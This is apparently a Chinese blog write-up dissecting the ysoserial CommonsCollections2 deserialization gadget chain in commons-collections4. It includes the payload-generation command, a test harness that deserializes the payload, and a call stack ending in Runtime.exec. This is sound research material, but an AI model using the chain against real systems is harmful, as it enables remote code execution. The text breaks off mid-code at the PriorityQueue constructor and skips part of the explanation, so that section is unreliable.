# 简介
分析完了`CommonsCollections1`，就接着分析下`CommonsCollections2`。
测试环境：
  * commons-collections-4.0
  * java version "1.8.0_112"
分析目标命令：
    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
下载Ysoserial源码：
    git clone https://github.com/frohoff/ysoserial.git
IDEA打开`pom.xml`，导入为`maven`项目。
# 小知识
## javassist
`javassist`是一个开源的分析、编辑和创建Java字节码的类库。其主要的优点，在于简单，而且快速。直接使用
java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。
`Ysoserial`在生成Payload中也是使用的`javassist`类库。
几个重要的`Javassist`类对象：
  * `ClassPool`：一个基于`Hashtable`实现的`CtClass`对象容器，其中键名是类名称，值是表示该类的`CtClass`对象。
  * `CtClass`：`CtClass`表示类，一个`CtClass`(编译时类）对象可以处理一个`class`文件，这些`CtClass`对象可以从`ClassPool`获得。
  * `CtMethods`：表示类中的方法。
  * `CtFields`：表示类中的字段。
创建`ClassPool`对象
    //ClassPool pool = new ClassPool(true);
    ClassPool pool = ClassPool.getDefault();
使用的是默认系统的类搜索路径获取`ClassPool`对象
添加类搜索路径
    pool.insertClassPath(new ClassClassPath(this.getClass()));
    //pool.insertClassPath("/usr/local/javalib");
将类搜索路径插入到搜索路径，或者将目录作为类搜索路径
查找并获取`CtClass`对象
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath("XXXXXXX"));
    CtClass ctClass = pool.get("XXXXX");
依据`key`从`Hash`表中查找对应的`CtClass`对象
`CtClass`可被修改
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath("XXXXXXX"));
    CtClass ctClass = pool.get("XXXXX");
    ctClass.setSuperclass(pool.get("XXXXXX"));
修改并设置父类
    byte[] b = ctClass.toBytecode();
获取修改后的字节码
    Class clazz = ctClass.toClass();
转换成`Class`对象
## 优先级队列 PriorityQueue
`PriorityQueue`一个基于优先级的无界优先级队列。
优先级队列的元素按照其自然顺序进行排序，放入`PriorityQueue`的元素，必须实现`Comparable`接口，`PriorityQueue`会根据元素的排序顺序决定出队的优先级；或者根据构造队列时提供的`Comparator`进行排序，元素就不必实现`Comparable`接口，具体取决于所使用的构造方法。
    /**
         * Creates a {@code PriorityQueue} with the specified initial capacity
         * that orders its elements according to the specified comparator.
         *
         * @param  initialCapacity the initial capacity for this priority queue
         * @param  comparator the comparator that will be used to order this
         *         priority queue.  If {@code null}, the {@linkplain Comparable
         *         natural ordering} of the elements will be used.
         * @throws IllegalArgumentException if {@code initialCapacity} is
         *         less than 1
         */
        public PriorityQueue(int initialCapacity,
                             Comparator comparator) {
            // Note: This restriction of at least one is not actually needed,
            // but continues for 1.5 compatibility
            if (initialCapacity )
org.apache.commons.collections4.comparators.TransformingComparator#TransformingComparator(org.apache.commons.collections4.Transformer, java.util.Comparator)
`TransformingComparator`类实例中的`transformer`成员存储`InvokerTransformer`实例，`TransformingComparator`类实例又作为参数传入`PriorityQueue`。
java.util.PriorityQueue#PriorityQueue(int, java.util.Comparator)
`TransformingComparator`类实例存储在`PriorityQueue`的`comparator`成员中
ysoserial/payloads/CommonsCollections2.java:44
通过反射修改`InvokerTransformer`实例中的`iMethodName`成员为`newTransformer`
ysoserial/payloads/CommonsCollections2.java:47
通过反射获取`PriorityQueue`实例的`queue`数组成员，并将`TemplatesImpl`类实例放入成员数组，最后返回`PriorityQueue`对象，序列化后输出作为payload。
java.util.PriorityQueue#siftDown
# Gadget chain
maven依赖：
        org.apache.commons
        commons-collections4
        4.0
测试代码：
    package test;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.util.Queue;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    public class commonscollections2 {
        public static void main(String[] args) throws IOException, ClassNotFoundException {
            FileInputStream fis = null;
            //fis = new FileInputStream("src/test/java/test/test.ser");
            fis = new FileInputStream("/Users/rai4over/Desktop/ysoserial/test.ser");
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
        }
    }
作者给出的：
    /*
        Gadget chain:
            ObjectInputStream.readObject()
                PriorityQueue.readObject()
                    ...
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
     */
java.util.PriorityQueue#readObject
`PriorityQueue`重写了`readObject`，首先通过`defaultReadObject`执行默认的反序列化操作
java.util.PriorityQueue#queue
`queue`成员本来被`transient`修饰，不能默认反序列化，但自定义通过循环设置成员数组`queue`，此时两个关键成员：
java.util.PriorityQueue#heapify
进入`heapify`进行排序，循环遍历成员数组`queue`，`TemplatesImpl`实例作为参数传入`siftDown`
java.util.PriorityQueue#siftDownUsingComparator
org.apache.commons.collections4.comparators.TransformingComparator#compare
org.apache.commons.collections4.functors.InvokerTransformer#transform
通过反射调用`TemplatesImpl`类中的`newTransformer`方法
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses
在循环中通过`loader.defineClass`加载恶意字节码到`_class`成员，回到上层函数，`_class[_transletIndex].newInstance()`进行实例化，完成命令执行，函数调用栈：
    exec:347, Runtime (java.lang)
    :-1, Pwner71837519276875 (ysoserial)
    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
    newInstance:423, Constructor (java.lang.reflect)
    newInstance:442, Class (java.lang)
    getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    transform:129, InvokerTransformer (org.apache.commons.collections4.functors)
    compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
    siftDownUsingComparator:721, PriorityQueue (java.util)
    siftDown:687, PriorityQueue (java.util)
    heapify:736, PriorityQueue (java.util)
    readObject:795, PriorityQueue (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1058, ObjectStreamClass (java.io)
    readSerialData:1909, ObjectInputStream (java.io)
    readOrdinaryObject:1808, ObjectInputStream (java.io)
    readObject0:1353, ObjectInputStream (java.io)
    readObject:373, ObjectInputStream (java.io)
    main:14, commonscollections2 (test)
# 参考